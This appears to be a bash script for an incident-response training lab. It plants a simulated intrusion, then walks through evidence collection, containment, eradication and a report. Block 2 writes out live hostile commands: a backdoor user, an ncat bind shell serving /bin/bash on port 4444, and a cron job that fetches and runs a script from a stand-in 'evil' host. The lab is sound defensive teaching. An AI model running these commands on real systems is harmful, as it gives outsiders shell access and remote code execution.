#!/usr/bin/env bash
# Lab 29 — Incident Response: Live-Triage and Forensics
# Auto-assembled from the lab's command blocks. Review before running.
# Run on the Killercoda Ubuntu Playground: https://killercoda.com/playgrounds/scenario/ubuntu
set -uo pipefail

echo '=== block 1 ==='
mkdir -p /evidence/$(date +%Y%m%d) && cd /evidence/$(date +%Y%m%d)
echo "Case: lab-incident-001" > case.txt
echo "Analyst: $(whoami)"     >> case.txt
date -u >> case.txt

echo '=== block 2 ==='
apt-get install -y ncat >/dev/null 2>&1 || apt-get install -y nmap >/dev/null 2>&1
useradd -m attacker -s /bin/bash
echo "attacker:Pwn3d!" | chpasswd
nohup ncat -lk 4444 -e /bin/bash >/tmp/.x 2>&1 &
echo "* * * * * curl -s http://evil/loader.sh | sh" | crontab -u attacker -

echo '=== block 3 ==='
ss -tlnp | grep 4444
ps -ef | grep -E "ncat|bash" | head
crontab -u attacker -l
last -i | head

echo '=== block 4 ==='
ps auxf > ps.txt
ss -tnp > sockets.txt
ip neigh > arp.txt
who > who.txt
last > last.txt
cp /var/log/auth.log auth.log 2>/dev/null || journalctl _COMM=sshd > auth.log
crontab -u attacker -l > attacker.crontab
sha256sum *.txt *.log *.crontab > evidence.sha256
cat evidence.sha256

echo '=== block 5 ==='
iptables -I INPUT -p tcp --dport 4444 -j DROP
usermod -L attacker            # disable account
pkill -u attacker || true

echo '=== block 6 ==='
crontab -u attacker -r
pkill ncat 2>/dev/null
userdel -rf attacker
iptables -D INPUT -p tcp --dport 4444 -j DROP

echo '=== block 7 ==='
ss -tlnp | grep 4444 || echo "no backdoor listener"
grep attacker /etc/passwd || echo "user removed"
crontab -u attacker -l 2>&1 | grep "no crontab" && echo "cron clean"

echo '=== block 8 ==='
cat > report.md <<EOF
# Incident lab-incident-001 Report
- **Detected**: $(date -u)
- **IoCs**: TCP/4444 listener; user 'attacker'; cron exfil
- **Containment**: iptables drop, account locked
- **Eradication**: process killed, user removed, cron purged
- **Recovery**: ports clean, user table clean, cron clean
- **Evidence hash file**: evidence.sha256
EOF
sha256sum report.md

